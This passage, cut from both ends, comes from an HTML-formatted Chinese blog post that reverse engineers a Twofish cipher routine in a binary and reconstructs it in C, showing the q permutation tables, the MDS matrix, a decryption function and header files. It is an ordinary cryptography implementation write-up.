class="number">0xf9</span>,<span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x4f</span>,<span class="number">0xf2</span>,<span class="number">0x65</span>,<span class="number">0x8e</span>,<span class="number">0x78</span>,<span class="number">0x5c</span>,<span class="number">0x58</span>,<span class="number">0x19</span>,<span class="number">0x8d</span>,<span class="number">0xe5</span>,<span class="number">0x98</span>,<span class="number">0x57</span>,<span class="number">0x67</span>,<span class="number">0x7f</span>,<span class="number">0x5</span>,<span class="number">0x64</span>,</span><br><span class="line"><span class="number">0xaf</span>,<span class="number">0x63</span>,<span class="number">0xb6</span>,<span class="number">0xfe</span>,<span class="number">0xf5</span>,<span class="number">0xb7</span>,<span class="number">0x3c</span>,<span class="number">0xa5</span>,<span class="number">0xce</span>,<span class="number">0xe9</span>,<span class="number">0x68</span>,<span class="number">0x44</span>,<span class="number">0xe0</span>,<span class="number">0x4d</span>,<span class="number">0x43</span>,<span class="number">0x69</span>,</span><br><span class="line"><span class="number">0x29</span>,<span class="number">0x2e</span>,<span class="number">0xac</span>,<span class="number">0x15</span>,<span class="number">0x59</span>,<span class="number">0xa8</span>,<span class="number">0xa</span>,<span class="number">0x9e</span>,<span class="number">0x6e</span>,<span class="number">0x47</span>,<span class="number">0xdf</span>,<span class="number">0x34</span>,<span class="number">0x35</span>,<span class="number">0x6a</span>,<span class="number">0xcf</span>,<span class="number">0xdc</span>,</span><br><span class="line"><span class="number">0x22</span>,<span class="number">0xc9</span>,<span class="number">0xc0</span>,<span class="number">0x9b</span>,<span class="number">0x89</span>,<span class="number">0xd4</span>,<span class="number">0xed</span>,<span class="number">0xab</span>,<span class="number">0x12</span>,<span class="number">0xa2</span>,<span class="number">0xd</span>,<span class="number">0x52</span>,<span class="number">0xbb</span>,<span class="number">0x2</span>,<span class="number">0x2f</span>,<span class="number">0xa9</span>,</span><br><span class="line"><span class="number">0xd7</span>,<span class="number">0x61</span>,<span class="number">0x1e</span>,<span class="number">0xb4</span>,<span class="number">0x50</span>,<span class="number">0x4</span>,<span class="number">0xf6</span>,<span class="number">0xc2</span>,<span class="number">0x16</span>,<span class="number">0x25</span>,<span class="number">0x86</span>,<span class="number">0x56</span>,<span class="number">0x55</span>,<span class="number">0x9</span>,<span class="number">0xbe</span>,<span class="number">0x91</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>MDS矩阵运算<br><img src="https://i.loli.net/2019/07/25/5d39335e7c98176996.jpg" alt></p><blockquote><p>S-box生成</p></blockquote><p><img src="https://i.loli.net/2019/07/25/5d3933a271f7034024.jpg" alt></p><blockquote><p>输入白化，循环，输出白化  sub_401626</p></blockquote><p><img src="https://i.loli.net/2019/07/25/5d39363aca3b346223.jpg" alt></p><p>c实现<br><img src="https://i.loli.net/2019/07/25/5d393666d494e15914.jpg" alt></p><p>f函数<br><img src="https://i.loli.net/2019/07/25/5d39463d2a01720818.jpg" alt></p><h2 id="算法解密"><a href="#算法解密" class="headerlink" title="算法解密"></a>算法解密</h2><p>解密函数如下<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_decryt</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint8_t</span> *cypher, <span class="keyword">uint8_t</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> r0, r1, r2, r3, f0, f1, c2,c3;</span><br><span class="line">    <span class="comment">/* Input Whitenening */</span></span><br><span class="line">    r0 = tf_twofish-&gt;k[<span class="number">4</span>]^pack(cypher);</span><br><span class="line">    r1 = tf_twofish-&gt;k[<span class="number">5</span>]^pack(cypher+<span class="number">4</span>);</span><br><span class="line">    r2 = tf_twofish-&gt;k[<span class="number">6</span>]^pack(cypher+<span class="number">8</span>);</span><br><span class="line">    r3 = tf_twofish-&gt;k[<span class="number">7</span>]^pack(cypher+<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The black box */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">15</span>; i &gt;= <span class="number">0</span>;--i)</span><br><span class="line">    &#123;</span><br><span class="line">        Twofish_f(tf_twofish, i, r0, r1, &amp;f0, &amp;f1);</span><br><span class="line">        c2 = (rol(r2,<span class="number">1</span>)^f0);</span><br><span class="line">        c3 = ror((f1^r3),<span class="number">1</span>);</span><br><span class="line">        <span class="comment">/* swap */</span></span><br><span class="line">        r2 = r0;</span><br><span class="line">        r3 = r1;</span><br><span class="line">        r0 = c2;</span><br><span class="line">        r1 = c3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Output Whitening */</span></span><br><span class="line">    c2 = r0;</span><br><span class="line">    c3 = r1;</span><br><span class="line">    r0 = tf_twofish-&gt;k[<span class="number">0</span>]^r2;</span><br><span class="line">    r1 = tf_twofish-&gt;k[<span class="number">1</span>]^r3;</span><br><span class="line">    r2 = tf_twofish-&gt;k[<span class="number">2</span>]^c2;</span><br><span class="line">    r3 = tf_twofish-&gt;k[<span class="number">3</span>]^c3;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        data[i]   = unpack(r0,i);</span><br><span class="line">        data[i+<span class="number">4</span>] = unpack(r1,i);</span><br><span class="line">        data[i+<span class="number">8</span>] = unpack(r2,i);</span><br><span class="line">        data[i+<span class="number">12</span>]= unpack(r3,i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>因此TwoFish加解密代码如下</p><p>twofish.h<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __TWOFISH__H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __TWOFISH__H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdint.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TWOFISH</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  TWOFISH</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">twofish_t</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> len;</span><br><span class="line">    <span class="keyword">uint32_t</span> k[<span class="number">40</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> s[<span class="number">4</span>][<span class="number">256</span>];</span><br><span class="line">&#125;<span class="keyword">twofish_t</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish MDS Multiply Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   tf_twofish</span></span><br><span class="line"><span class="comment"> * @param   data</span></span><br><span class="line"><span class="comment"> * @param   cypher</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_encryt</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint8_t</span> *data, <span class="keyword">uint8_t</span> *cypher)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish Decryption Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @paramtf_twofish</span></span><br><span class="line"><span class="comment"> * @param   cypher</span></span><br><span class="line"><span class="comment"> * @param   data</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Twofish_decryt</span><span class="params">(<span class="keyword">twofish_t</span>* tf_twofish, <span class="keyword">uint8_t</span> *cypher, <span class="keyword">uint8_t</span> *data)</span></span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Twofish Setup Function</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Description:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param   s</span></span><br><span class="line"><span class="comment"> * @param   len</span></span><br><span class="line"><span class="comment"> * @usage</span></span><br><span class="line"><span class="comment"> * &#123;@code&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">twofish_t</span>*  Twofish_setup(<span class="keyword">uint8_t</span> *s, <span class="keyword">uint32_t</span> len);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></p><p>tables.h</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">ifndef</span> __TABLES__H</span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> __TABLES__H</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">/* The MDS Matrix */</span></span><br><span class="line"> <span class="keyword">uint8_t</span> mds[<span class="number">4</span>][<span class="number">4</span>]=</span><br><span class="line"> &#123;</span><br><span class="line">    &#123;<span class="number">0x01</span>, <span class="number">0xef</span>, <span class="number">0x5b</span>, <span class="number">0x5b</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0x5b</span>, <span class="number">0xef</span>, <span class="number">0xef</span>, <span class="number">0x01</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0xef</span>, <span class="number">0x5b</span>, <span class="number">0x01</span>, <span class="number">0xef</span>&#125;,</span><br><span class="line">    &#123;<span class="number">0xef</span>, <span class="number">0x01</span>, <span class="number">0xef</span>, <span class="number">0x5b</span>&#125;</span><br><span class="line"> &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">uint8_t</span> q[<span class="number">2</span>][<span class="number">256</span>] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* q0 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line"><span class="number">0xa9</span>,<span class="number">0x67</span>,<span class="number">0xb3</span>,<span class="number">0xe8</span>,<span class="number">0x4</span>,<span class="number">0xfd</span>,<span class="number">0xa3</span>,<span class="number">0x76</span>,<span class="number">0x9a</span>,<span class="number">0x92</span>,<span class="number">0x80</span>,<span class="number">0x78</span>,<span class="number">0xe4</span>,<span class="number">0xdd</span>,<span class="number">0xd1</span>,<span class="number">0x38</span>,</span><br><span class="line"><span class="number">0xd</span>,<span class="number">0xc6</span>,<span class="number">0x35</span>,<span class="number">0x98</span>,<span class="number">0x18</span>,<span class="number">0xf7</span>,<span class="number">0xec</span>,<span class="number">0x6c</span>,<span class="number">0x43</span>,<span class="number">0x75</span>,<span class="number">0x37</span>,<span class="number">0x26</span>,<span class="number">0xfa</span>,<span class="number">0x13</span>,<span class="number">0x94</span>,<span class="number">0x48</span>,</span><br><span class="line"><span class="number">0xf2</span>,<span class="number">0xd0</span>,<span class="number">0x8b</span>,<span class="number">0x30</span>,<span class="number">0x84</span>,<span class="number">0x54</span>,<span class="number">0xdf</span>,<span class="number">0x23</span>,<span class="number">0x19</span>,<span class="number">0x5b</span>,<span class="number">0x3d</span>,<span class="number">0x59</span>,<span class="number">0xf3</span>,<span class="number">0xae</span>,<span class="number">0xa2</span>,<span class="number">0x82</span>,</span><br><span class="line"><span class="number">0x63</span>,<span class="number">0x1</span>,<span class="number">0x83</span>,<span class="number">0x2e</span>,<span class="number">0xd9</span>,<span class="number">0x51</span>,<span class="number">0x9b</span>,<span class="number">0x7c</span>,<span class="number">0xa6</span>,<span class="number">0xeb</span>,<span class="number">0xa5</span>,<span class="number">0xbe</span>,<span class="number">0x16</span>,<span class="number">0xc</span>,<span class="number">0xe3</span>,<span class="number">0x61</span>,</span><br><span class="line"><span class="number">0xc0</span>,<span class="number">0x8c</span>,<span class="number">0x3a</span>,<span class="number">0xf5</span>,<span class="number">0x73</span>,<span class="number">0x2c</span>,<span class="number">0x25</span>,<span class="number">0xb</span>,<span class="number">0xbb</span>,<span class="number">0x4e</span>,<span class="number">0x89</span>,<span class="number">0x6b</span>,<span class="number">0x53</span>,<span class="number">0x6a</span>,<span class="number">0xb4</span>,<span class="number">0xf1</span>,</span><br><span class="line"><span class="number">0xe1</span>,<span class="number">0xe6</span>,<span class="number">0xbd</span>,<span class="number">0x45</span>,<span class="number">0xe2</span>,<span class="number">0xf4</span>,<span class="number">0xb6</span>,<span class="number">0x66</span>,<span class="number">0xcc</span>,<span class="number">0x95</span>,<span class="number">0x3</span>,<span class="number">0x56</span>,<span class="number">0xd4</span>,<span class="number">0x1c</span>,<span class="number">0x1e</span>,<span class="number">0xd7</span>,</span><br><span class="line"><span class="number">0xfb</span>,<span class="number">0xc3</span>,<span class="number">0x8e</span>,<span class="number">0xb5</span>,<span class="number">0xe9</span>,<span class="number">0xcf</span>,<span class="number">0xbf</span>,<span class="number">0xba</span>,<span class="number">0xea</span>,<span class="number">0x77</span>,<span class="number">0x39</span>,<span class="number">0xaf</span>,<span class="number">0x33</span>,<span class="number">0xc9</span>,<span class="number">0x62</span>,<span class="number">0x71</span>,</span><br><span class="line"><span class="number">0x81</span>,<span class="number">0x79</span>,<span class="number">0x9</span>,<span class="number">0xad</span>,<span class="number">0x24</span>,<span class="number">0xcd</span>,<span class="number">0xf9</span>,<span class="number">0xd8</span>,<span class="number">0xe5</span>,<span class="number">0xc5</span>,<span class="number">0xb9</span>,<span class="number">0x4d</span>,<span class="number">0x44</span>,<span class="number">0x8</span>,<span class="number">0x86</span>,<span class="number">0xe7</span>,</span><br><span class="line"><span class="number">0xa1</span>,<span class="number">0x1d</span>,<span class="number">0xaa</span>,<span class="number">0xed</span>,<span class="number">0x6</span>,<span class="number">0x70</span>,<span class="number">0xb2</span>,<span class="number">0xd2</span>,<span class="number">0x41</span>,<span class="number">0x7b</span>,<span class="number">0xa0</span>,<span class="number">0x11</span>,<span class="number">0x31</span>,<span class="number">0xc2</span>,<span class="number">0x27</span>,<span class="number">0x90</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0xf6</span>,<span class="number">0x60</span>,<span class="number">0xff</span>,<span class="number">0x96</span>,<span class="number">0x5c</span>,<span class="number">0xb1</span>,<span class="number">0xab</span>,<span class="number">0x9e</span>,<span class="number">0x9c</span>,<span class="number">0x52</span>,<span class="number">0x1b</span>,<span class="number">0x5f</span>,<span class="number">0x93</span>,<span class="number">0xa</span>,<span class="number">0xef</span>,</span><br><span class="line"><span class="number">0x91</span>,<span class="number">0x85</span>,<span class="number">0x49</span>,<span class="number">0xee</span>,<span class="number">0x2d</span>,<span class="number">0x4f</span>,<span class="number">0x8f</span>,<span class="number">0x3b</span>,<span class="number">0x47</span>,<span class="number">0x87</span>,<span class="number">0x6d</span>,<span class="number">0x46</span>,<span class="number">0xd6</span>,<span class="number">0x3e</span>,<span class="number">0x69</span>,<span class="number">0x64</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0xce</span>,<span class="number">0xcb</span>,<span class="number">0x2f</span>,<span class="number">0xfc</span>,<span class="number">0x97</span>,<span class="number">0x5</span>,<span class="number">0x7a</span>,<span class="number">0xac</span>,<span class="number">0x7f</span>,<span class="number">0xd5</span>,<span class="number">0x1a</span>,<span class="number">0x4b</span>,<span class="number">0xe</span>,<span class="number">0xa7</span>,<span class="number">0x5a</span>,</span><br><span class="line"><span class="number">0x28</span>,<span class="number">0x14</span>,<span class="number">0x3f</span>,<span class="number">0x29</span>,<span class="number">0x88</span>,<span class="number">0x3c</span>,<span class="number">0x4c</span>,<span class="number">0x2</span>,<span class="number">0xb8</span>,<span class="number">0xda</span>,<span class="number">0xb0</span>,<span class="number">0x17</span>,<span class="number">0x55</span>,<span class="number">0x1f</span>,<span class="number">0x8a</span>,<span class="number">0x7d</span>,</span><br><span class="line"><span class="number">0x57</span>,<span class="number">0xc7</span>,<span class="number">0x8d</span>,<span class="number">0x74</span>,<span class="number">0xb7</span>,<span class="number">0xc4</span>,<span class="number">0x9f</span>,<span class="number">0x72</span>,<span class="number">0x7e</span>,<span class="number">0x15</span>,<span class="number">0x22</span>,<span class="number">0x12</span>,<span class="number">0x58</span>,<span class="number">0x7</span>,<span class="number">0x99</span>,<span class="number">0x34</span>,</span><br><span class="line"><span class="number">0x6e</span>,<span class="number">0x50</span>,<span class="number">0xde</span>,<span class="number">0x68</span>,<span class="number">0x65</span>,<span class="number">0xbc</span>,<span class="number">0xdb</span>,<span class="number">0xf8</span>,<span class="number">0xc8</span>,<span class="number">0xa8</span>,<span class="number">0x2b</span>,<span class="number">0x40</span>,<span class="number">0xdc</span>,<span class="number">0xfe</span>,<span class="number">0x32</span>,<span class="number">0xa4</span>,</span><br><span class="line"><span class="number">0xca</span>,<span class="number">0x10</span>,<span class="number">0x21</span>,<span class="number">0xf0</span>,<span class="number">0xd3</span>,<span class="number">0x5d</span>,<span class="number">0xf</span>,<span class="number">0x0</span>,<span class="number">0x6f</span>,<span class="number">0x9d</span>,<span class="number">0x36</span>,<span class="number">0x42</span>,<span class="number">0x4a</span>,<span class="number">0x5e</span>,<span class="number">0xc1</span>,<span class="number">0xe0</span></span><br><span class="line">&#125;,</span><br><span class="line">    <span class="comment">/* q1 */</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line"><span class="number">0x75</span>,<span class="number">0xf3</span>,<span class="number">0xc6</span>,<span class="number">0xf4</span>,<span class="number">0xdb</span>,<span class="number">0x7b</span>,<span class="number">0xfb</span>,<span class="number">0xc8</span>,<span class="number">0x4a</span>,<span class="number">0xd3</span>,<span class="number">0xe6</span>,<span class="number">0x6b</span>,<span class="number">0x45</span>,<span class="number">0x7d</span>,<span class="number">0xe8</span>,<span class="number">0x4b</span>,</span><br><span class="line"><span class="number">0xd6</span>,<span class="number">0x32</span>,<span class="number">0xd8</span>,<span class="number">0xfd</span>,<span class="number">0x37</span>,<span class="number">0x71</span>,<span class="number">0xf1</span>,<span class="number">0xe1</span>,<span class="number">0x30</span>,<span class="number">0xf</span>,<span class="number">0xf8</span>,<span class="number">0x1b</span>,<span class="number">0x87</span>,<span class="number">0xfa</span>,<span class="number">0x6</span>,<span class="number">0x3f</span>,</span><br><span class="line"><span class="number">0x5e</span>,<span class="number">0xba</span>,<span class="number">0xae</span>,<span class="number">0x5b</span>,<span class="number">0x8a</span>,<span class="number">0x0</span>,<span class="number">0xbc</span>,<span class="number">0x9d</span>,<span class="number">0x6d</span>,<span class="number">0xc1</span>,<span class="number">0xb1</span>,<span class="number">0xe</span>,<span class="number">0x80</span>,<span class="number">0x5d</span>,<span class="number">0xd2</span>,<span class="number">0xd5</span>,</span><br><span class="line"><span class="number">0xa0</span>,<span class="number">0x84</span>,<span class="number">0x7</span>,<span class="number">0x14</span>,<span class="number">0xb5</span>,<span class="number">0x90</span>,<span class="number">0x2c</span>,<span class="number">0xa3</span>,<span class="number">0xb2</span>,<span class="number">0x73</span>,<span class="number">0x4c</span>,<span class="number">0x54</span>,<span class="number">0x92</span>,<span class="number">0x74</span>,<span class="number">0x36</span>,<span class="number">0x51</span>,</span><br><span class="line"><span class="number">0x38</span>,<span class="number">0xb0</span>,<span class="number">0xbd</span>,<span class="number">0x5a</span>,<span class="number">0xfc</span>,<span class="number">0x60</span>,<span class="number">0x62</span>,<span class="number">0x96</span>,<span class="number">0x6c</span>,<span class="number">0x42</span>,<span class="number">0xf7</span>,<span class="number">0x10</span>,<span class="number">0x7c</span>,<span class="number">0x28</span>,<span class="number">0x27</span>,<span class="number">0x8c</span>,</span><br><span class="line"><span class="number">0x13</span>,<span class="number">0x95</span>,<span class="number">0x9c</span>,<span class="number">0xc7</span>,<span class="number">0x24</span>,<span class="number">0x46</span>,<span class="number">0x3b</span>,<span class="number">0x70</span>,<span class="number">0xca</span>,<span class="number">0xe3</span>,<span class="number">0x85</span>,<span class="number">0xcb</span>,<span class="number">0x11</span>,<span class="number">0xd0</span>,<span class="number">0x93</span>,<span class="number">0xb8</span>,</span><br><span class="line"><span class="number">0xa6</span>,<span class="number">0x83</span>,<span class="number">0x20</span>,<span class="number">0xff</span>,<span class="number">0x9f</span>,<span class="number">0x77</span>,<span class="number">0xc3</span>,<span class="number">0xcc</span>,<span class="number">0x3</span>,<span class="number">0x6f</span>,<span class="number">0x8</span>,<span class="number">0xbf</span>,<span class="number">0x40</span>,<span class="number">0xe7</span>,<span class="number">0x2b</span>,<span class="number">0xe2</span>,</span><br><span class="line"><span class="number">0x79</span>,<span class="number">0xc</span>,<span class="number">0xaa</span>,<span class="number">0x82</span>,<span class="number">0x41</span>,<span class="number">0x3a</span>,<span class="number">0xea</span>,<span class="number">0xb9</span>,<span class="number">0xe4</span>,<span class="number">0x9a</span>,<span class="number">0xa4</span>,<span class="number">0x97</span>,<span class="number">0x7e</span>,<span class="number">0xda</span>,<span class="number">0x7a</span>,<span class="number">0x17</span>,</span><br><span class="line"><span class="number">0x66</span>,<span class="number">0x94</span>,<span class="number">0xa1</span>,<span class="number">0x1d</span>,<span class="number">0x3d</span>,<span class="number">0xf0</span>,<span class="number">0xde</span>,<span class="number">0xb3</span>,<span class="number">0xb</span>,<span class="number">0x72</span>,<span class="number">0xa7</span>,<span class="number">0x1c</span>,<span class="number">0xef</span>,<span class="number">0xd1</span>,<span class="number">0x53</span>,<span class="number">0x3e</span>,</span><br><span class="line"><span class="number">0x8f</span>,<span class="number">0x33</span>,<span class="number">0x26</span>,<span class="number">0x5f</span>,<span class="number">0xec</span>,<span class="number">0x76</span>,<span class="number">0x2a</span>,<span class="number">0x49</span>,<span class="number">0x81</span>,<span class="number">0x88</span>,<span class="number">0xee</span>,<span class="number">0x21</span>,<span class="number">0xc4</span>,<span class="number">0x1a</span>,<span class="number">0xeb</span>,<span class="number">0xd9</span>,</span><br><span class="line"><span class="number">0xc5</span>,<span class="number">0x39</span>,<span class="number">0x99</span>,<span class="number">0xcd</span>,<span class="number">0xad</span>,<span class="number">0x31</span>,<span class="number">0x8b</span>,<span class="number">0x1</span>,<span class="number">0x18</span>,<span class="number">0x23</span>,<span class="number">0xdd</span>,<span class="number">0x1f</span>,<span class="number">0x4e</span>,<span class="number">0x2d</span>,<span class="number">0xf9</span>,<span class="number">0x48</span>,</span><br><span class="line"><span class="number">0x4f</span>,<span class="number">0xf2</span>,<span class="number">0x65</span>,<span class="number">0x8e</span>,<span class="number">0x78</span>,<span class="number">0x5c</span>,<span class="number">0x58</span>,<span class="number">0x19</span>,<span class="number">0x8d</span>,<span class="number">0xe5</span>,<span class="number">0x98</span>,<span class="number">0x57</span>,<span class="number">0x67</span>,<span class="number">0x7f</span>,<span class="number">0x5</span>,<span class="number">0x64</span>,</span><br><span class="line"><span class="number">0xaf</span>,<span class="number">0x63</span>,<span class="number">0xb6</span>,<span class="number">0xfe</span>,<span class="number">0xf5</span>,<span class="number">0xb7</span>,<span class="number">0x3c</span>,<span class="number">0xa5</span>,<span class="number">0xce</span>,<span class="number">0xe9</span>,<span class="number">0x68</span>,<span class="number">0x44</span>,<span class="number">0xe0</span>,<span class="number">0x4d</span>,<span class="number">0x43</span>,<span class="number">0x69</span>,</span><br><span class="line"><span class="number">0x29</span>,<span class="number">0x2e</span>,<span class="number">0xac</span>,<span class="number">0x15</span>,<span class="number">0x59</span>,<span class="number">0xa8</span>,<span class="number">0xa</span>,<span class="number">0x9e</span>,<span class="number">0x6e</span>,<span class="number">0x47</span>,<span class="number">0xdf</span>,<span class="number">0x34</span>,<span class="number">0x35</span>,<span class="number">0x6a</span>,<span class="number">0xcf</span>,<span class="number">0xdc</span>,</span><br><span class="line"><span class="number">0x22</span>,<span class="number">0xc9</span>,<span class="number">0xc0</span>,<span class="number">0x9b</span>,<span class="number">0x89</span>,<span class="number">0xd4</span>,<span class="number">0xed</span>,<span class="number">0xab</span>,<span class="number">0x12</span>,<span class="number">0xa2</span>,<span class="number">0xd</span>,<span class="number">0x52</span>,<span class="number">0xbb</span>,<span class="number">0x2</span>,<span class="number">0x2f</span>,<span class="number">0xa9</span>,</span><br><span class="line"><span class="number">0xd7</span>,<span class="number">0x61</span>,<span class="number">0x1e</span>,<span class="number">0xb4</span>,<span class="number">0x50</span>,<span class="number">0x4</span>,<span class="number">0xf6</span>,<span class="number">0xc2</span>,<span class="number">0x16</span>,<span class="number">0x25</span>,<span class="number">0x86</span>,<span class="number">0x56</span>,<span class="number">0x55</span>,<span class="number">0x9</span>,<span class="number">0xbe</span>,<span class="number">0x91</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>twofish.c<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"twofish.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"tables.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> xor(g,r)    (g^r)                   <span class="comment">/* Xor operation */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ror(g,n)    ((g&gt;&gt;n)|(g&lt;&lt;(32-n)))    <span class="comment">/* Rotate right  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rol(g,n)    ((g<span class="meta-string">&lt;&lt;n)|(g&gt;&gt;(32-n)))    /* Rotate left   */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> nxt(g,r)    (*(g+r))                <span class="comment">/* Get next byte */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LITTILE_ENDIAN</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  LITTILE_ENDIAN</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unpack(g,r) ((g&gt;&gt;(r*8))&amp;0xff)                               <span class="comment">/* Extracts a byte from a word.  */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pack(g)     ((*(g))|(*(g+1)&lt;&lt;8)|(*(g+2)&lt;&lt;16)|(*(g+3)&lt;&lt;24))  <span class="comment">/* Converts four byte to a word. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rsm(i,a,b,c,d,e,f,g,h)  \</span></span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>),a,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">1</span>),b,<span class="number">0x14d</span>)^\</span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">2</span>),c,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">3</span>),d,<span class="number">0x14d</span>)^\</span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">4</span>),e,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">5</span>),f,<span class="number">0x14d</span>)^\</span><br><span class="line">        gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">6</span>),g,<span class="number">0x14d</span>)^gf(nxt(tf_key-&gt;k,r*<span class="number">8</span>+<span class="number">7</span>),h,<span class="number">0x14d</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> u(x,a)\</span></span><br><span class="line">        x[<span class="number">0</span>] = unpack(a,<span class="number">0</span>); \</span><br><span class="line">        x[<span class="number">1</span>] = unpack(a,<span class="number">1</span>); \</span><br><span class="line">        x[<span class="number">2</span>] = unpack(a,<span class="number">2</span>); \</span><br><span class="line">        x[<span class="number">3</span>] = unpack(a,<span class="number">3</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> release(a,b,c)  &#123; free(a); free(b);free(c); &#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span>  TWOFISH</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">key_t</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> len;</span><br><span class="line">    <span class="keyword">uint8_t</span> *k;</span><br><span class="line">&#125;<span class="keyword">key_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">subkey_t</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> len;</span><br><span class="line">    <span class="keyword">uint8_t</span> s[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> me[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> mo[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line">&#125;<span class="keyword">subkey_t</span>;</span><br><span class="line"><span class="meta">#<span 